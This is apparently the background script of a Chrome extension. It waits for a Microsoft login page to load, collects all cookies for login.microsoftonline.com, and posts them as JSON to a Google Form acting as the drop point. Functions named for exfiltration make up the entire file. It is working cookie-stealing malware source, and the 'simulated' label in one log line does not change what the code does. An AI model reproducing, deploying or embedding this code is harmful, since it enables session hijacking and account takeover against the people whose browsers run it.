// Constants for Google Form
const FORM_URL = "https://docs.google.com/forms/d/e/xxxxxxxxxxxxxxxxxx/formResponse";
const FIELD_NAME = "entry.1776303417"; // e.g., entry.1234567890
function extractAndExfiltrateCookies() { 
  chrome.cookies.getAll({}, (cookies) => { 
    // Filter the cookies for the ones related to Microsoft login domain
    const filteredCookies = cookies.filter(cookie => 
      cookie.domain.includes("login.microsoftonline.com")
    ); 
 
    if (filteredCookies.length === 0) { 
      return; 
    } 
 
      exfiltrateCookiesToGoogleForm(filteredCookies); 
  }); 
}

function exfiltrateCookiesToGoogleForm(cookies) { 
  const cookieJson = JSON.stringify(cookies, null, 2); 

  const formData = new URLSearchParams(); 
  formData.append(FIELD_NAME, cookieJson); 

  fetch(FORM_URL, { 
    method: "POST", 
    body: formData, 
    headers: { 
      "Content-Type": "application/x-www-form-urlencoded" 
    },
    mode: "no-cors"  // Add 'no-cors' mode to bypass CORS policy
  }).then(() => {
    console.log("Cookies exfiltrated (simulated).");
  }).catch(err => {
    console.error("Exfiltration failed:", err);
  }); 
}

// Trigger only on login page load
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.url && changeInfo.url.includes("https://login.microsoftonline.com")) {
    console.log("Detected Microsoft login, extracting cookies...");
    extractAndExfiltrateCookies();
  }
});

console.log("Background service worker loaded");
